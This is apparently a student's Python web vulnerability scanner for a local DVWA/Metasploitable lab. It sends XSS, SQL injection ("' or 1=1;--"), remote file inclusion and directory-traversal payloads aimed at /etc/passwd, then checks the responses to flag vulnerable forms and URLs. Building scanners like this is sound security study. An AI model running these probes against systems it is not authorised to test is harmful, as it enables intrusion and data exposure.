import sys
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup as bSoup

sPy = requests.Session()
sPy.headers[
    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
                    "Chrome/83.0.4103.106 Safari/537.36 "


# This for testing the local metasploitable virtual machine box which uses the DVWA application server
# and you need to login to the application before you can run any tests

# you also need the PHP cookie id, or look for the user token field.
# I'm using the cookie because the looking for user token proved unsuccessful


# login_payload = {
#     'username': 'admin',
#     'password': 'password',
#     'Login': 'Login',
# }
# cookies = dict(security='low', PHPSESSID='')
#
# sPy.cookies.update(cookies)
#
# sPy.post('http://172.16.218.131/dvwa/login.php', data=login_payload)

# this is to test that we have logged in successfully and can access a page, it will get the page and print it

# r = sPy.get('http://192.168.59.128/dvwa/vulnerabilities/fi/?page=include.php')
# print(r.text)

# collecting any available forms here with the Beautiful soup library
def collect_the_forms(t_address):
    soup = bSoup(sPy.get(t_address).content, "html.parser")
    return soup.find_all("form")


# storing the forms in a list to be used later

def details_of_the_form(form):
    form_details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()

    dataInputs = []

    for data_tag in form.find_all("input"):
        form_input_type = data_tag.attrs.get("type", "text")
        nameOfInput = data_tag.attrs.get("name")
        valueOfInput = data_tag.attrs.get("value", "")
        dataInputs.append(
            {"type": form_input_type, "name": nameOfInput, "value": valueOfInput})
    form_details["action"] = action
    form_details["method"] = method
    form_details["inputs"] = dataInputs
    return form_details


# filling out and sending the forms, if any are gathered

def post_the_form(form_details, t_address, value):
    target_url = urljoin(t_address, form_details["action"])

    theInputs = form_details["inputs"]
    data = {}
    for found_input in theInputs:

        if found_input["type"] == "text" or found_input["type"] == "search":
            found_input["value"] = value
        nameOfInput = found_input.get("name")
        valueOfInput = found_input.get("value")
        if nameOfInput and valueOfInput:
            data[nameOfInput] = valueOfInput
    if form_details["method"] == "post":
        return sPy.post(target_url, data=data)
    else:

        return sPy.get(target_url, params=data)


# The Cross Site Scripting Function
# The greeting variable is just for the report
# The function, grabs the stored form(s) if there are any,
# fills them out with the testing script string and posts them back to the site
# Upon receiving the server response,
# the function will analyse the page to see if the script string has been inserted into the form successfully
# The returned form msg variable stores the result of the function because that will be used in the GUI.
# Print has no return value therefore it will break the GUI without this variable
def scan_for_xss(t_address):
    greeting = "-------------------Scanning for XSS---------------------"
    forms = collect_the_forms(t_address)
    returned_form_msg = ""

    testing_script = "<sCriPt>alert('Testing for XSS')</ScriPt>"

    vulnerable_page = False
    # iterate over all forms
    if len(forms) == 0:
        print("The are no forms in this address")
        return greeting + "\n" + "There are no forms in this address"

    elif len(forms) != 0:
        print("Scanning form(s)...")
        for form in forms:
            form_details = details_of_the_form(form)
            page_content = post_the_form(form_details, t_address, testing_script).content.decode()

            if testing_script in page_content:
                vulnerable_page = True

            if testing_script not in page_content:
                vulnerable_page = False

            if vulnerable_page:
                returned_form_msg = f"Found XSS at this address: {t_address}\n\n" \
                                    f"Here is the vulnerable form\n {form_details} "

            if not vulnerable_page:
                returned_form_msg = "Sorry, no XSS was found"

        return greeting + "\n" + returned_form_msg


# This holds Database/Server error messages that arise when testing for SQLi.
# If these appear it is a sign the page could be vulnerable to SQLi
def vulnerable_errors(response):
    database_errors = {

        "you have an error in your sql syntax",
        "mysql_fetch_array",
        "Warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }

    for error in database_errors:
        if error in response.content.decode().lower():
            return True
    return False


# The SQLi function SQLi is short for SQL injection This tests both any available forms and the URL address itself
# It first grabs the url and then applies a few ways to check for SQLi such as adding apostrophes
# and the "or 1=1;--" attack which makes the query always true
# Upon server response the function analyses the page for any errors that arose from searching this query
# and saves the result
# It repeats the same thing for the forms Used the code from
# thepythoncode SQL scanner but added to it so that the function now performs multiple ways to scan for SQLi instead
# of just filling out apostrophes

def scan_for_sqli(t_address):
    greeting = "-------------------Scanning for SQLi ------------------ "
    returned_msg = ""
    returned_form_msg = ""
    sqli_string = "' or 1=1;--"

    for a in '"':
        new_url = f"{t_address}{a}"
        serverResponse = sPy.get(new_url)
        if vulnerable_errors(serverResponse):
            returned_msg = f"A possible SQLi has been found at this address: {new_url} "
            print(returned_msg)
        if not vulnerable_errors(serverResponse):
            for b in "'":
                new_url = f"{t_address}{b}"
                serverResponse = sPy.get(new_url)
                if vulnerable_errors(serverResponse):
                    returned_msg = f"A possible SQLi has been found at this address: {new_url} "
                    print(returned_msg)
                if not vulnerable_errors(serverResponse):
                    sqli_url = f"{t_address}{sqli_string}"
                    print("Trying again with OR attacks ")
                    secondResponse = sPy.get(sqli_url)
                    if vulnerable_errors(secondResponse):
                        returned_msg = f"A possible SQLi has been found at this address: {sqli_url} "
                        print(returned_msg)
                    if not vulnerable_errors(secondResponse):
                        returned_msg = "Sorry, there are no SQLis at this url address. "
                        print(returned_msg)

    forms = collect_the_forms(t_address)
    if len(forms) == 0:
        returned_form_msg = "There are no forms in this address"
        print(returned_form_msg)

    elif len(forms) != 0:
        for form in forms:
            form_details = details_of_the_form(form)
            for x in '"':
                print("Scanning form(s) pass 1... ")
                data = {}
                for form_tag in form_details["inputs"]:
                    if form_tag["type"] == "hidden" or form_tag["value"]:
                        try:
                            data[form_tag["name"]] = form_tag["value"] + x
                        except:
                            pass
                    elif form_tag["type"] != "submit":
                        data[form_tag["name"]] = f"test{x}"
                t_address = urljoin(t_address, form_details["action"])
                if form_details["method"] == "post":
                    serverResponse = sPy.post(t_address, data=data)
                elif form_details["method"] == "get":
                    serverResponse = sPy.get(t_address, params=data)
                if vulnerable_errors(serverResponse):
                    returned_form_msg = f"A possible SQLi has been found in this form: {t_address} \n Here is the " \
                                        f"vulnerable form: {form_details} "
                    print(returned_form_msg)

                if not vulnerable_errors(serverResponse):
                    for y in "'":
                        print("Scanning form(s) pass 2... ")
                        data = {}
                        for form_tag in form_details["inputs"]:
                            if form_tag["type"] == "hidden" or form_tag["value"]:
                                try:
                                    data[form_tag["name"]] = form_tag["value"] + x
                                except:
                                    pass
                            elif form_tag["type"] != "submit":
                                data[form_tag["name"]] = f"test{y}"
                        t_address = urljoin(t_address, form_details["action"])
                        if form_details["method"] == "post":
                            serverResponse = sPy.post(t_address, data=data)
                        elif form_details["method"] == "get":
                            serverResponse = sPy.get(t_address, params=data)
                        if vulnerable_errors(serverResponse):
                            returned_form_msg = f"A possible SQLi has been found in this form: {t_address} " \
                                                f"\n Here is the " \
                                                f"vulnerable form: {form_details} "
                            print(returned_form_msg)
                        if not vulnerable_errors(serverResponse):
                            print("Scanning form(s) pass 3... ")
                            data = {}
                            for form_tag in form_details["inputs"]:
                                if form_tag["type"] == "hidden" or form_tag["value"]:
                                    try:
                                        data[form_tag["name"]] = form_tag["value"] + sqli_string
                                    except:
                                        pass
                                elif form_tag["type"] != "submit":
                                    data[form_tag["name"]] = f"test{x}"
                            t_address = urljoin(t_address, form_details["action"])
                            if form_details["method"] == "post":
                                serverResponse = sPy.post(t_address, data=data)
                            elif form_details["method"] == "get":
                                serverResponse = sPy.get(t_address, params=data)
                            if vulnerable_errors(serverResponse):
                                returned_form_msg = f"A possible SQLi has been found in this form: {t_address} \n " \
                                                    f"Here is the vulnerable form: {form_details} "

                                print(returned_form_msg)
                            # something else here
                            if not vulnerable_errors(serverResponse):
                                returned_form_msg = "Sorry, no SQLis have been found in this form"
                                print(returned_form_msg)

    return greeting + "\n" + returned_msg + "\n" + "\n" + returned_form_msg


# The RFI (Remote File Inclusion) function
# For this function one must have a quick php server started with just 1 file called testing.php.
# You can also name it differently and change the name in the varaible accordingly
# Reason why the php server must be started before hand
# is because the address of the server will be used in the server address variable.
# The function will get the target address and the server address where the testing file is
# and append the server address to the end of the target address where the parameter and equals sign is
# This is so the target can access and open the testing file and display the contents
# When successful the contents of the file will be displayed on the page
# Very loosely based on the LFI function but added the php server and testing script

def scan_for_rfi(t_address):
    greeting = "-------------------Scanning for RFI---------------------"
    grab_address = sPy.get(t_address)
    print("Target address: " + grab_address.url)
    parsed_address = urlparse(grab_address.url)
    # returned_msg = " "
    queryKey = parsed_address.query
    equals_key = "="
    question_key = "?"
    testFile = "testing.php"
    rfi_test_string = "It works!"
    server_address = ""  # change this to your test php server address

    newServerAddress = "http://" + server_address

    if question_key and equals_key in grab_address.url:
        print("Address has parameter(s):", queryKey)
        newQuery = queryKey.replace(queryKey, queryKey[0:5])
        query_p1 = "".join(parsed_address[0:1]) + "://"
        query_p2 = "".join(parsed_address[1:2])
        query_p3 = "".join(parsed_address[2:3]) + "?"
        query_p4 = "".join(newQuery)

        attackURL = query_p1 + query_p2 + query_p3 + query_p4 + newServerAddress + "/" + testFile

        results = sPy.get(attackURL)
        theSource = results.content.decode()

        if rfi_test_string in theSource:
            returned_msg = "Remote file accessed successfully"
            print(returned_msg)
        else:
            returned_msg = "Sorry, no remote files found"
            print(returned_msg)

    else:
        returned_msg = "No parameters, therefore can't proceed"
        print(returned_msg)
    return greeting + "\n" + returned_msg

# The LFI (Local file inclusion) function
# This is similar to the RFI function, except for this function, no external servers are needed
# LFI works in the way of URL modification to access internal files
# It grabs the url and looks for a parameter and value
# It then constructs the directory traversal attack
# by grabbing the target url
# and continuosly adding ../ to each depth while looking for a specified file
# If decided whether it has found the file or not
# by looking into the server response content for a certain specfied string
# Partly used the script by sUbc0ol /LFI-scanner on github originally made for Python 2
# but I have rewritten it to be for Python 3 because the Python 2 script failed to run
# and also improved on the loop to check for multiple depths until the file is found

def scan_for_lfi(t_address):
    greeting = "-------------------Scanning for LFI---------------------"
    get_url = sPy.get(t_address)
    parsed_url = urlparse(get_url.url)
    scriptPath = parsed_url.path
    # returned_msg = ""
    # returned_msg_key = ""
    theKeyword = parsed_url.query
    param_equals = "="
    param_query = "?"
    param_and = "&"
    depthOfPath = 0
    dir_query = "../"
    max_depth = 10
    i = 1
    findRoot = "root:x:0:0:"
    lookingFor = "etc/passwd"
    theFileDir = "/etc/passwd"
    if len(scriptPath) == 0:
        returned_msg = "No scripts present in the path"
        print(returned_msg)
    else:
        returned_msg = f"Scripts in the path: {scriptPath}"
        print(returned_msg)
    if len(theKeyword) == 0:
        returned_msg_key = "No keyword queries present in the path"
        print(returned_msg_key)
    else:
        returned_msg_key = F"The query is: {theKeyword}"
        print(returned_msg_key)
    if param_query and param_equals in t_address:
        print("1 parameter is present. Searching for extra parameters...")
        if param_and in parsed_url.query and param_equals in parsed_url.query:
            print("More parameters have been found")
        else:
            print("There are no more parameters. Moving on to scanning...")
        newQuery = theKeyword.replace(theKeyword, theKeyword[0:5])
        query_p1 = "".join(parsed_url[0:1]) + "://"
        query_p2 = "".join(parsed_url[1:2])
        query_p3 = "".join(parsed_url[2:3]) + "?"
        query_p4 = "".join(newQuery)
        for depth in range(i, max_depth + 1):

            if depthOfPath == 0:
                query_p4 = "".join(newQuery + (depthOfPath * dir_query) + theFileDir)

            if depthOfPath != 0:
                query_p4 = "".join(newQuery + (depthOfPath * dir_query) + lookingFor)

            finalString = query_p1 + query_p2 + query_p3 + query_p4

            scan_res = sPy.get(finalString)
            res_source = scan_res.content.decode()
            if findRoot in res_source:

                returned_msg = f"It worked! The file was found! \n Address: {scan_res.url}"
                print(returned_msg)

                break
            elif findRoot not in res_source:

                depthOfPath = depth
            if depthOfPath == max_depth and findRoot not in res_source:
                returned_msg = "Sorry, no file inclusion found"
                print(returned_msg)

    else:
        returned_msg = "No parameters found. Please add parameters, as there is nothing to scan \n Goodbye for now"
        print(returned_msg)

    return greeting + "\n" + returned_msg


if __name__ == "__main__":
    url = sys.argv[1]

    print("-------------------Scanning for SQLi ------------------ ")
    scan_for_sqli(url)

    # print("-------------------Scanning for XSS---------------------")
    # scan_for_xss(url)
    # print("-------------------Scanning for RFI---------------------")
    # scan_for_rfi(url)
    # print("-------------------Scanning for LFI---------------------")
    # scan_for_lfi(url)
